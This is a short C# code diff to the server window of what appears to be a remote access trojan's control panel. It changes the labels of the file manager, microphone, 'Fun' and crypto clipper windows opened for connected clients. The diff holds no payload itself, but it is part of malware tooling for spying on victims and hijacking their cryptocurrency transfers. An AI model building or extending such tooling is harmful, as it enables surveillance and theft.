@@ -661,7 +661,7 @@ public partial class ServerWindow : Window
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
             OpenFeatureWindow<FileManagerWindow>(c.Id, () =>
-                new FileManagerWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+                new FileManagerWindow(_server, c.Id, c.Id));
     }
 
     private void Microphone_Click(object sender, RoutedEventArgs e)
@@ -670,7 +670,7 @@ public partial class ServerWindow : Window
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
             OpenFeatureWindow<MicrophoneWindow>(c.Id, () =>
-                new MicrophoneWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+                new MicrophoneWindow(_server, c.Id, c.Id));
     }
 
     private void Fun_Click(object sender, RoutedEventArgs e)
@@ -679,7 +679,7 @@ public partial class ServerWindow : Window
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
             OpenFeatureWindow<FunWindow>(c.Id, () =>
-                new FunWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+                new FunWindow(_server, c.Id, c.Id));
     }
 
     private void ProcessManager_Click(object sender, RoutedEventArgs e)
@@ -730,7 +730,7 @@ public partial class ServerWindow : Window
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
             OpenFeatureWindow<CryptoClipperWindow>(c.Id, () =>
-                new CryptoClipperWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+                new CryptoClipperWindow(_server, c.Id, c.Id));
         Log($"[*] Crypto Clipper opened for {clients.Count} client(s).");
     }
 
